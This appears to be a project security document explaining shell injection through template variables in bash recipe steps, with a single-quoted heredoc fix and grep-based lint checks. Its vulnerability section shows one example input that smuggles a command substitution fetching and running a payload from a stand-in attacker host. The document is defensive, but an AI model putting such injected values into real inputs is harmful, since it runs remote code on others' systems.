---
updated: 2026-03-12
issues: ["#3045", "#3076"]
---

# Preventing Shell Injection in Recipe Bash Steps

> [Home](../index.md) > [Security](./README.md) > Shell Injection in Recipes

Recipe template variables like `{{task_description}}` are substituted into bash `command:` blocks
**before the shell evaluates them**. Without explicit quoting, any shell metacharacter in the
value — backticks, `$()`, `$VAR`, single or double quotes, backslashes, newlines — executes as
part of the shell command.

This is CWE-78 (OS Command Injection). The fix is a single-quoted heredoc capture.

---

## Contents

- [The Vulnerability](#the-vulnerability)
- [The Fix: Single-Quoted Heredoc](#the-fix-single-quoted-heredoc)
- [Applying the Pattern](#applying-the-pattern)
- [Multi-Assignment Steps](#multi-assignment-steps)
- [Pipeline Normalization](#pipeline-normalization)
- [Affected Steps in default-workflow](#affected-steps-in-default-workflow)
- [Verifying a Recipe Is Safe](#verifying-a-recipe-is-safe)
- [Anti-Patterns to Avoid](#anti-patterns-to-avoid)

---

## The Vulnerability

Consider this vulnerable step:

```yaml
# UNSAFE — do not use this pattern
- id: "step-create-issue"
  type: "bash"
  command: |
    ISSUE_TITLE=$(printf '%s' {{task_description}})
    gh issue create --title "$ISSUE_TITLE"
```

If `task_description` is:

```
Add logout button $(curl -s https://evil.example/payload | bash)
```

the shell expands `$(curl …)` **before** the `printf` runs. The attacker controls the
shell mid-command.

The same risk applies to:

```yaml
TASK_DESC='{{task_description}}'         # breaks on single-quotes in the value
TASK_DESC="{{task_description}}"         # double-quotes do not block $() or backticks
printf '%s' {{task_description}}         # metacharacters evaluated before printf sees them
```

---

## The Fix: Single-Quoted Heredoc

A POSIX single-quoted heredoc (`<<'EOFTASKDESC'`) passes the body to `cat` with **no shell
interpretation**. Every metacharacter is treated as a literal byte.

```yaml
- id: "step-create-issue"
  type: "bash"
  command: |
    _TD_RAW=$(cat <<'EOFTASKDESC'
    {{task_description}}
    EOFTASKDESC
    ) && \
    gh issue create --title "$_TD_RAW"
```

What this achieves:

| Threat                          | Neutralized by                              |
| ------------------------------- | ------------------------------------------- |
| `$(...)` / backtick execution   | Single-quoted heredoc — never evaluated     |
| `$VAR` expansion                | Single-quoted heredoc — never evaluated     |
| Single-quote in value           | Heredoc body; no quoting rules apply        |
| Double-quote in value           | Heredoc body; no quoting rules apply        |
| Backslash sequences             | Heredoc body; no interpretation             |
| Newline injection into git/gh   | Pipeline normalization (see below)          |
| Word-splitting / glob expansion | Double-quoted downstream reference `"$VAR"` |

---

## Applying the Pattern

### Step 1 — Capture once per step

```yaml
command: |
  _TD_RAW=$(cat <<'EOFTASKDESC'
  {{task_description}}
  EOFTASKDESC
  ) && \
```

`_TD_RAW` now holds the raw value. The `&&` chains subsequent commands so the step
fails immediately if the capture fails.

### Step 2 — Reference with double quotes everywhere downstream

```yaml
  echo "Task: $_TD_RAW" && \
  gh issue create --title "$_TD_RAW"
```

Double quotes on `"$_TD_RAW"` prevent word-splitting and glob expansion. Never use
`$_TD_RAW` unquoted.

### Step 3 — Split `export VAR=$(...)` into capture + export

The shell pattern `export VAR=$(cmd)` masks the exit code of `cmd`. Use two statements:

```yaml
  # WRONG — exit code of $(cat ...) is lost
  export TASK_VAL=$(cat <<'EOFTASKDESC'
  {{task_description}}
  EOFTASKDESC
  )

  # CORRECT
  TASK_VAL=$(cat <<'EOFTASKDESC'
  {{task_description}}
  EOFTASKDESC
  ) && export TASK_VAL
```

---

## Multi-Assignment Steps

When a step uses `{{task_description}}` in multiple variables, capture once and reuse:

```yaml
command: |
  _TD_RAW=$(cat <<'EOFTASKDESC'
  {{task_description}}
  EOFTASKDESC
  ) && \
  ISSUE_TITLE="$_TD_RAW" && \
  ISSUE_TASK="$_TD_RAW" && \
  COMMIT_TITLE=$(printf 'feat: %s' "$_TD_RAW") && \
  ...
```

Do **not** open multiple heredocs for the same value in one step — it is redundant and harder
to read.

---

## Pipeline Normalization

Variables bound for single-line fields (git commit title, GitHub issue title, PR title) must
have newlines stripped. The `cat` heredoc preserves all newlines from the template value.

```yaml
  # Strip newlines, carriage returns, and truncate to 200 chars for titles
  TITLE=$(printf '%s' "$_TD_RAW" | tr '\n\r' '  ' | cut -c1-200)
  git commit -m "$TITLE"
```

| Use case              | Normalization needed          |
| --------------------- | ----------------------------- |
| `git commit -m`       | `tr '\n\r' ' '` + `cut -c1-200` |
| `gh issue create --title` | `tr '\n\r' ' '` + `cut -c1-200` |
| `gh pr create --title`    | `tr '\n\r' ' '` + `cut -c1-200` |
| Multi-line PR body    | None — newlines are valid     |
| `json.dumps` via env  | None — Python handles it      |

---

## Affected Steps in default-workflow

The following steps in `amplifier-bundle/recipes/default-workflow.yaml` use the heredoc
pattern (issues #3045 and #3076):

| Step ID                   | Variable captured | Downstream use              |
| ------------------------- | ----------------- | --------------------------- |
| `step-00-init`            | `_TD_RAW`         | Init log output             |
| `step-03-create-issue`    | `_TD_RAW`         | GitHub issue title and body |
| `step-04-setup-worktree`  | `TASK_DESC`       | Branch name slug generation |
| `step-15-commit-push`     | `_TD_RAW`         | Commit title (`feat: …`)    |
| `step-16-create-draft-pr` | `_TD_RAW`         | PR title and body           |
| `step-22b-final-status`   | `_TD_RAW`         | Status log output           |
| `workflow-complete`       | `TASK_VAL`        | JSON output via `os.environ` |

`prompt:` type steps (e.g. `step-02-clarify-requirements`) also contain
`{{task_description}}` but are passed to the agent as text — they are not bash-evaluated
and are not affected by this vulnerability.

---

## Verifying a Recipe Is Safe

Run these checks against any recipe file before merging:

```bash
# 1. No bare printf with {{task_description}} in bash command blocks
grep -n "printf.*{{task_description}}" amplifier-bundle/recipes/default-workflow.yaml
# Expected: no output

# 2. Every {{task_description}} inside a bash command: block is inside a heredoc body
#    (preceded by EOFTASKDESC on the line above)
grep -B1 "{{task_description}}" amplifier-bundle/recipes/default-workflow.yaml \
  | grep -v "EOFTASKDESC\|prompt:\|#\|task_description.*:\|description"
# Expected: no output (all bash-context occurrences are heredoc body lines)

# 3. No eval/bash -c/sh -c receiving _TD_RAW or derived variables
grep -n 'eval\|bash -c\|sh -c' amplifier-bundle/recipes/default-workflow.yaml \
  | grep -i '_TD_RAW\|TASK_VAL\|TASK_DESC'
# Expected: no output
```

Add these as a CI lint step to prevent regression:

```yaml
# .github/workflows/recipe-security-lint.yaml
- name: Check for shell injection patterns in recipes
  run: |
    if grep -rn "printf.*{{task_description}}" amplifier-bundle/recipes/; then
      echo "FAIL: vulnerable printf pattern found" >&2
      exit 1
    fi
    echo "PASS: no vulnerable printf patterns"
```

---

## Anti-Patterns to Avoid

| Pattern | Problem | Use instead |
| ------- | ------- | ----------- |
| `printf '%s' {{task_description}}` | Template substituted before shell sees it | `$(cat <<'EOFTASKDESC' ... EOFTASKDESC)` |
| `TASK='{{task_description}}'` | Breaks when value contains `'` | Same heredoc capture |
| `TASK="{{task_description}}"` | `$()` and backticks still execute | Same heredoc capture |
| `export VAR=$(cat <<'EOF'...EOF)` | Masks exit code | Capture then `export` |
| Multiple heredocs for same value | Redundant, harder to read | Capture once, reuse `"$_TD_RAW"` |
| `$_TD_RAW` unquoted | Word-splitting and glob expansion | Always `"$_TD_RAW"` |

---

## Related Documentation

- [Security Overview](./README.md) — All security features
- [Recipe Runner Reference](../reference/recipe-runner.md) — Step types and bash normalization
- [Write Recipe Conditions](../howto/write-recipe-conditions.md) — Bash output in conditions
- [Bash Output Normalization](../concepts/bash-output-normalization.md) — How outputs are stored

---

**Security classification:** CWE-78 OS Command Injection
**OWASP alignment:** A03:2021 Injection
**Fixed in:** Issues [#3045](../../issues/3045) and [#3076](../../issues/3076)
